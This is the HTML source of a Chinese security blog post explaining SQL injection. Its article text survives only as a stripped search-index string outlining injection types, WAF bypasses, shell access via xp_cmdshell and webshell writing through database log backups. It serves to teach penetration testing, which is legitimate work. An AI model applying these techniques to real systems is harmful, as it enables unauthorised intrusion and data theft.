<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL注入详解 | Jackhou Blog</title><meta name="keywords" content="安全,SQL"><meta name="author" content="Jack hou"><meta name="copyright" content="Jack hou"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL注入详解"><meta name="application-name" content="SQL注入详解"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入详解"><meta property="og:url" content="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/index.html"><meta property="og:site_name" content="Jackhou Blog"><meta property="og:description" content="一、sql 注入概述 SQL 注入即是指 web 应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在 web 应用程序中事先定义好的查询语句的结尾上添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg"><meta property="article:author" content="Jack hou"><meta property="article:tag" content="Jackhou, blog"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover3.jpg"><meta name="description" content="一、sql 注入概述 SQL 注入即是指 web 应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在 web 应用程序中事先定义好的查询语句的结尾上添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@1.0.17/lib/assets/font-awesome-animation.min.css"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://twikoo.houyanbin.com/',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: {"apiurl":null},
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Jack hou","link":"链接: ","source":"来源: Jackhou Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#3b70fc","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'Jackhou Blog',
  title: 'SQL注入详解',
  postAI: '',
  pageFillDescription: '一、sql 注入概述, 二、寻找 sql 注入, 三、sql 注入的类型, Mysql 注入, 普通注入, 报错注入, 延时注入, 布尔注入, 堆叠注入, 二次注入, 加密解密注入, Dnslog 对外注入, 中转注入, 搜索框注入, 宽字节注入, Cookie 注入和 Xff 注入, Between 注入, limit 注入, order by 注入, 绕过空格, 绕过引号, 绕过逗号, 绕过比较符号 (), Between 注入, or and xor not 绕过：, 绕过注释符, 绕过等于号, 绕过 unionselectwhere 等：, WAF 绕过 - 应用层, 大小写 x2F 关键字替换, 各种编码, 注释使用, 再次循环, 分块传输, 等价替换, 参数污染, 编码解码及加密解密, 更改请求提交方式, 中间件 HPP(HTTP 参数污染), WAF 绕过 - 数据库特性, WAF 绕过 - 逻辑层, 普通注入, 全回显操作, 报错注入, (2) 单个爆破：, (2) 全爆语句, 时间注入, 布尔盲注, XP_CMDSHELL 检测, 拿 shell 方法, (1)xp_cmdshell 拿 shell, (2) 差异备份拿 shell, 普通注入, 有回显：, 无回显：, 偏移注入（回显数连续）, 偏移注入（常规操作）, 常规有回显注入, 第二种常规注入, 报错注入, 布尔注入, 时间盲注, DNSlog 注入, 拓展, Sqlite 注入, Postsql 注入, Oracle 注入一注入概述注入即是指应用程序对用户输入数据的合法性没有判断或过滤不严攻击者可以在应用程序中事先定义好的查询语句的结尾上添加额外的语句在管理员不知情的情况下实现非法操作以此来实现欺骗数据库服务器执行非授权的任意查询从而进一步得到相应的数据信息在实战和测试中难免会遇见到一些注入下面我将总结一些常用注入中的不同姿势二寻找注入测试注入点在参数后面添加单引号或双引号查看返回包如果报错或者长度变化可能存在注入注入点判断常见通过构造请求再相应的头信息等查找敏感喜喜通过构造一些语句检测服务器中响应的异常三注入的类型附上自己整理的思维导图学习常见的数据库类型分为关系型数据库和非关系型数据库关系型数据库有和等非关系型数据库有和等注入普通注入数字型测试步骤加单引号对应的这时语句出错程序无法正常从数据库中查询出数据就会抛出异常加对应的语句执行正常与原始页面没有差异加对应的语句可以正常执行但是无法查询出结果所以返回数据与原始网页存在差异字符型测试步骤加单引号由于加单引号后变成三个单引号则无法执行程序会报错加此时语句为也无法进行注入还需要通过注释符号将其绕过因此构造语句为可成功执行返回结果正确加此时语句为则会报错如果满足以上三点可以判断该为字符型注入判断列数报错没有报错说明存在列爆出数据库爆出数据表数据库爆出字段数据表爆出数据值字段数据库名数据表名拓展一些其他函数系统用户名用户名当前用户名连接数据库的用户名数据库名数据库版本读取本地文件的函数读取数据库路径安装路径操作系统多条数据显示函数报错注入函数爆出版本号爆出操作系统爆数据库爆数据表爆字段爆数据函数细节问题基本一样改个关键字即可与有个很大的区别实在末尾注入加上如而函数末尾不加数值爆数据库爆数据表爆字段函数溢出错误在时则不能返回查询结果函数爆数据库不断改变得到其他爆出表爆出字段爆出数值延时注入判断注入点正常休眠无休眠无休眠无休眠爆出数据库通过判断服务器没有睡眠码转换为那么就得出数据库第一个字符为下面就可以一次类推了就不一可以通过改变的值来判断数据的地几个字符为什么爆出数据表解释的第一张表的第一个字符为为字符还是改变的的得出第二个字符再判断字符判断语句判断函数判断附上一篇文档盲注脚本布尔注入判断语句判断语句判断堆叠注入二次注入二次注入一般是用于白盒测试黑盒测试就算是找到注入也没办法攻击博客链接加密解密注入这是一个加密的字符串其中是编码中的符号把他发送到编码模块当中解密得到明文发现这个是注入点需要将原来的注入方式重新加密发送给服务器可以构造注入语句进行加密进行报错注入对外注入通常我们面对注入过程中没有回显的情况下只能通过盲注的方式来判断是否存在注入但是使用盲注手工测试是需要花费大量的时间的可能会想到使用直接去跑出数据但在实际测试中使用跑盲注有很大的几率网站把给封掉这就影响了我们的测试进度也许你也可以使用代理池注入语句中转注入比如受害者网站注入点是经过编码的不能直接结合进行漏洞利用所以本地搭建一个网站写一个脚本编码文件就可以结合工具进行测试因为注入点经过复杂编码之后就不能直接结合进行漏洞攻击了或者自己编写脚本进行攻击可参考搜索框注入注入数据库语句要查询的关键字正常错误有搜索数据的框可以试试加个总能大力出奇迹宽字节注入前提使用了函数数据库设置了编码模式为原理前端输入时首先经过转义变成之后在数据库查询前因为设置了编码编码在汉字编码范围内的两个字节都会重新编码成一个汉字然后服务器会对查询的语句进行编码编码成了运而单引号逃逸了出来形成了注入漏洞注入和注入主要是看看程序员有没有在中做了一些过滤我们有没有可趁之机注入代表客户端真实的通过修改的值可以伪造客户端尝试抓包添加插入头进行注入注入主要用于盲注看页面是否有变化原理如下例如的字符内容是第一个字符是到搜索不了页面不正常到就有了页面正常语句借鉴大佬图片注入语句可控点可控点后面能够拼接的函数只有和可以用来写文件本文我们不考虑在后面可以用这个子查询而且只能用和函数进行延时基于时间盲注注入表名列名或者数字升序默认升序表名列名或者数字降序当页面出现报错信息时注入点在后面此时可以利用报错信息进行注入尝试报错注入绕过空格两个空格代替一个空格用代替空格空格最基本的绕过方法用注释替换空格注释括号绕过空格语句这种过滤方法常常用于盲注例如绕过引号这个时候如果引号被过滤了那么上面的子句就无法使用了那么遇到这样的问题就要使用十六进制来处理这个问题了的十六进制的字符串是那么最后的语句就变为了绕过逗号在使用盲注的时候需要使用到这些子句方法都需要使用到逗号对于和这两个方法可以使用的方式来解决使用等价于使用等价于对于可以使用来绕过等价于下面这条语句绕过比较符号过滤了盲注经常使用使用的脚本使用前者返回最大值后者返回最小值同样是在使用盲注的时候在使用二分查找的时候需要使用到比较操作符来进行查找如果无法使用比较操作符那么就需要使用到来进行绕过了最常见的一个盲注的语句此时如果比较操作符被过滤上面的盲注语句则无法使用那么就可以使用来代替比较操作符了函数返回输入参数的最大值那么上面的这条语句可以使用变为如下的子句注入主要用于盲注看页面是否有变化原理如下例如的字符内容是第一个字符是到搜索不了页面不正常到就有了页面正常使用使用等价于绕过绕过注释符后面跟一个空格过滤最后的闭合查询语句的最后的单引号或者绕过等于号使用或者使用或者绕过等使用注释符绕过常用注释符用法使用大小写绕过内联注释绕过双关键字绕过若删除掉第一个匹配的就能绕过绕过应用层绕过姿势大小写关键字替换等价于等价于等价于等价于等价于绕过手工盲注各种编码大小写等注释使用等再次循环分块传输比如在抓包时存在请求的注入如尝试分块传输进行分块传输的时候请求头要加上然后的数据规则如下下面的数据的长度可以在后面加个分号然后添加注释请求的参数下面的数据的长度请求的值和前面的连起来表明分块请求结束一个和两个换行最后就是大佬写出的插件安装了一键分块等价替换举例和无法使用时或者参数污染编码解码及加密解密等更改请求提交方式尝试更改请求为请求等中间件参数污染是的缩写意为参数污染原理浏览器在跟服务器进行交互的过程中浏览器往往会在请求里面带上参数这些参数会以名称值对的形势出现通常在一个请求中同样名称的参数只会出现一次但是在协议中是允许同样名称的参数出现多次的比如下面这个链接针对同样名称的参数出现多次的情况不同的服务器的处理方式会不一样有的服务器是取第一个参数也就是有的服务器是取第二个参数也就是有的服务器两个参数都取也就是这种特性在绕过一些服务器端的逻辑判断时非常有用漏洞与服务器环境服务端使用的脚本有关如下是不同服务器对于出现多个参数时的选择通过接管账户当网站开发者不熟悉服务器对于多参数时如何选择将给攻击者可乘之机能针对客户端和服务端进行攻击参数污染还可以用于绕过某些防火墙对于注入的检测例如当服务器对多参数都同时选择时我们可以用以下这种方式绕过某些防火墙参数污染是指当同一参数出现多次不同的中间件会解析为不同的结果以参数为例绕过数据库特性注释符有三种注意后面有一个空格或者为空格符特殊符号换行符可结合注释符使用内联注释数字范围黑魔法绕过逻辑层逻辑问题云防护一般我们会尝试通过查找站点的真实从而绕过防护当提交同时请求时进入逻辑而忽略了请求的有害参数输入可尝试和同时开放服务没有做到的强制跳转导致有防护没有防护直接访问站点绕过防护特殊符号部分遇到截断只能获取到前面的参数无法获取到后面的有害参数输入从而导致比如性能问题猜想在设计系统时考虑自身性能问题当数据量达到一定层级不检测这部分数据只要不断的填充数据当数据达到一定数目之后恶意代码就不会被检测了猜想不少是语言写的而语言自身没有缓冲区保护机制因此如果在处理测试向量时超出了其缓冲区长度就会引发从而实现绕过例子指后面重复次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里只做参考也许在有些情况下可能不需要这么长也能溢出例子获取请求参数只获取前个参数第个参数并没有获取到导致注入绕过白名单方式一白名单从网络层获取的这种一般伪造不来如果是获取客户端的这样就可能存在伪造绕过的情况测试方法修改的来方式二静态资源特定的静态资源后缀请求常见的静态文件等等类似白名单机制为了检测效率不去检测这样一些静态文件名后缀的请求只识别到前面的后面基本不识别方式三白名单为了防止误拦部分内置默认的白名单列表如等管理后台只要中存在白名单的字符串就作为白名单不进行检测常见的构造姿势学习文章数据库是由开发和推广的关系数据库管理系统是一个比较大型的数据库端口号为数据库后缀名注释符是延时命令有三个权限级别权限数据库操作文件管理命令执行注册表读取等数据库的最高权限权限文件管理数据库操作等权限权限数据库操作判断是否是权限数据库操作文件管理命令执行注册表读取判断是否是权限数据库操作文件管理判断是否是权限数据库操作数据库有个默认的库分别是个系统数据库和个实例数据库其中系统数据库和默认是没有数据表的附上查询数据库的版本查询服务名查询主机名如果是用远程连接的话主机名是本地的名字查询当前数据库名查询第一个数据库名查询第二个数据库名查询当前数据库的拥有者结果为是每个数据库的默认用户具有所有者权限全称即切换到表查询前条记录查询第条开始的条数据也就是截取给定字符串的索引为的个字符查询给定字符串的值查询给定字符串的长度查询当前数据库的大小表名查询指定表名的大小判断是否是权限判断是否是权限判断是否是权限普通注入成功失败成功失败说明列数位于之间查找回显点挨个替换发现页面出现回显查找所在库名称添加找到数据库名称提示这里也可以使用等查询其他数据查找数据库表名称提示为用户表替换中的依次为查出所有列名查取数据获取用户名获取密码全回显操作获取当前数据库中的表有个语句可供选择使用下列语句可一次爆数据库所有表只限于及以上版本数据库名数据库名案例是数据库名字一次爆指定表的所有列只限于及以上版本数据库名数据库名指定表名数据库名数据库名指定表名案例是表名报错注入版本当前数据库名本地服务名判断是否是系统管理员常用权限判断是否是库权限判断是否有库读取权限单个爆破获取第一个表名获取第二个表名获取第一个列名全爆语句爆表要求版本以上数据库名数据库名爆列数据库名数据库名指定表名数据库名数据库名指定表名时间注入如果是权限就延时案例判断内容布尔盲注检测看下目标的存储过程是否还在主要是想看它有没有被删掉你也可以用这种方式来查询其它你想知道的任何存储过程如果判断还在页面显示正常不在的话页面报错开启一句话前提支持堆叠扩展存储过程没被删除前提权限探测是否存在端口然后检测是否开启用添加用户把用户加到组学习的文档拿方法前提具备或者权限目录的绝对路径可以利用的方式寻找绝对路径插个眼拿差异备份拿大概思路假设中的参数存在注入点并且获得数据库名字为爆出了物理路径为修改数据库设置为恢复模式完全恢复模式是默认的恢复模式在完全恢复模式下需要手工的对事务日志进行管理优点是可以恢复到数据库失败或者指定的时间点上备份当前数据库日志到文件备份数据库日志到服务器上其中路径是网页的物理路径建立一张表和一个字段往表中插入一句话马子中的内容一般转换为马子的值再次备份日志再次备份日志备份路径为网站服务器的物理路径删除表然后菜刀尝试连接参考文章这里是借鉴大佬的笔记的总结数据库没有记录所有表名和列名的表也就意味着我们需要依靠字典进行猜解表名和列数据库中没有注释符号因此和都没法使用语句普通注入判断注入点在参数后面加单引号页面报错页面正常页面报错猜字段报错正确有回显此时页面有显示查列列名表名假设存在报错说明不存在说明存在说明存在找到注入位即可爆出账号密码无回显查表表名存在的话就返回正常不存在就返回不正常查列列名表名查内容猜字段中第一条记录内容的第二个字符猜字段中第二条记录内容的第一个字符偏移注入回显数连续假设已经判断存在表下判断有行且回显如下回显字段连续返回错误页面返回错误页面返回错误页面返回到一个错误页面提示查询语句出错因此表的列数为因为回显如下图是连着的直接在后加表名爆出内容添加数值可得到更多的内容偏移注入常规操作偏移注入表名知道列名无法获取的情况下存在注入点且下判断出字段数为行爆出显位号判断直到页面错误有变化正确说明有个字段偏移注入基本公式为出的字段数减去号的字段数然而再用的字段数减去倍刚才得出来的答案也就是个字符个字符个字符一级偏移语句二级偏移语句实战常见的表和列也可以用的但是量大且效率低常见的表有最后根据企业名的缩写搭配上常见的列等等注入常规有回显注入返回正常则第一个字段是数字型返回错误为字符型判断显示位探测数据库版本信息查询第一个表名第二个表名获取关键表中的列名查看数据第二种常规注入确定回显位假设当前共个字段全是数字型判断方式如下假设回显位是爆当前数据库中的第一个表爆当前数据库中的第二个表第一个表以此类推去爆第个表爆某表中的第一个字段表名大写的爆某表中的第二个字段表名第一个字段爆其它字段以此类推爆某表中的第一行数据字段字段字段表名连接多个字段用到的连接符号是在数据库中函数只能连接两个字符串报错注入利用这种方法在中不需要任何权限但是在以及以后的版本中当前数据库用户必须有网络访问权限布尔注入时间盲注主要用即的第一位是时延时秒执行第二位是时延时秒注入这个函数在中是权限借鉴大佬博客拓展注入如果您的站点允许用户通过网页输入并将输入内容插入到数据库中这个时候您就面临着一个被称为注入的安全问题本章节将向您讲解如何防止这种情况的发生确保脚本和语句的安全这个是内置系统表相当于的但是这里只存有表的信息里面有个字段有各个表的结构有表名字段名和类型并不支持像那样的注释但是可以通过方式增加注释写会用到可参考注入是一种特性非常齐全的自由软件的对象关系型数据库管理系统版本为基础的对象关系型数据库管理系统安装后默认的端口是默认的用户名是默认的数据库也是注释符延时函数可参考谢公子的文章注入基础知识使用查询语句获取数据时需要跟上表名没有表的情况下可以使用是的虚拟表用来构成的语法规则保证里面永远只有一条记录的数据类型是强匹配的有弱匹配的味道所以在进行类似查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的也可以使用代替某些无法快速猜测出数据类型的位置参考文档学习总结本文主要是对注入的学习整理参考了一些大佬的文章还尚有不足需要多加学习望大佬们多多支持',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-21 01:43:48',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/null"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://www.houyanbin.com/" title="博客"><img class="back-menu-item-icon" src="/img/favicon.png" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">Jackhou Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/?id=8868465080&amp;server=tencent&amp;type=0"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg" target="_blank"><img class="post-qr-code-img" alt="wechat" src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/wechat.jpg"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg" target="_blank"><img class="post-qr-code-img" alt="alipay" src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/index/alipay.jpg"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Article/" style="font-size: 1.05rem; color: rgb(119, 188, 186);">Article<sup>4</sup></a><a href="/tags/CSRF/" style="font-size: 1.05rem; color: rgb(113, 75, 65);">CSRF<sup>1</sup></a><a href="/tags/Git/" style="font-size: 1.05rem; color: rgb(85, 46, 140);">Git<sup>1</sup></a><a href="/tags/Java/" style="font-size: 1.05rem; color: rgb(195, 101, 175);">Java<sup>3</sup></a><a href="/tags/JavaScript/" style="font-size: 1.05rem; color: rgb(144, 178, 199);">JavaScript<sup>17</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem; color: rgb(18, 24, 56);">Linux<sup>1</sup></a><a 